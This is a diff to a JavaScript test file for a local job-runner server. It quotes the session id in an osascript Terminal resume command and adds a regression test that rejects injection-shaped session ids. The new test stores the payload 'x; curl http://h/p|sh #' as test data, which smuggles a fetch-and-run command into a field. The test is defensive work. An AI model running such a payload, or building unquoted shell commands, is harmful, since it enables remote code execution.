@@ -10,7 +10,7 @@ import { readFileSync, mkdtempSync, writeFileSync } from 'node:fs';
 import {
   openDb, listRuns, getSetting, setSetting, recordRunUsage,
   createProject, getProject, acquireLease, listJobsByProject, createJob, getJob, findJobByBead,
-  listJobs, listProjects,
+  listJobs, listProjects, insertRun, updateRun,
 } from '../lib/db.js';
 import { createBeads } from '../lib/beads.js';
 import { createProjects } from '../lib/projects.js';
@@ -226,7 +226,11 @@ test('run-now, runs list, log, resume action', async (t) => {
   r = await req(base(), 'POST', `/api/runs/${runId}/actions/resume`);
   assert.equal(r.status, 200);
   assert.equal(osaCalls[0].cmd, 'osascript');
-  assert.ok(osaCalls[0].args[1].includes('--resume sess-x'));
+  // Quoted, not bare: `Terminal.do script` is arbitrary shell, so an unquoted
+  // sessionId would be a second command. The old assertion pinned the bare form,
+  // i.e. it pinned the vulnerable behaviour.
+  assert.ok(osaCalls[0].args[1].includes('--resume \\"sess-x\\"'),
+    `expected a quoted session id, got: ${osaCalls[0].args[1]}`);
   assert.ok(osaCalls[0].args[1].includes(job.cwd));
 
   r = await req(base(), 'POST', `/api/runs/${runId}/actions/nope`);
@@ -1722,4 +1726,21 @@ test('the burn-down apply route is gated: it force-enables jobs', async (t) => {
   assert.equal(r.body.code, 'approval_denied');
   assert.equal(approval.asked[0].action, 'budget.plan.apply');
   assert.equal(approval.asked[0].grace, false);
+});
+
+test('a resume action refuses an injection-shaped session id', async (t) => {
+  // `Terminal.do script` is arbitrary shell. sessionId comes from the CLI's own
+  // stream-json today so this is not remotely reachable — but the spec's reason
+  // for leaving this route ungated ("a client can only pick from a declared set")
+  // is a claim about the action *id*, not about what the action then builds.
+  const { db, server, base, osaCalls } = await boot();
+  t.after(() => server.close());
+
+  const { body: job } = await req(base(), 'POST', '/api/jobs', jobPayload());
+  const run = insertRun(db, { jobId: job.id, status: 'ok', trigger: 'manual' });
+  updateRun(db, run.id, { meta: JSON.stringify({ sessionId: 'x; curl http://h/p|sh #' }) });
+
+  const r = await req(base(), 'POST', `/api/runs/${run.id}/actions/resume`);
+  assert.notEqual(r.status, 200, 'a shell-shaped session id must not be actioned');
+  assert.equal(osaCalls.length, 0, 'osascript was never invoked');
 });
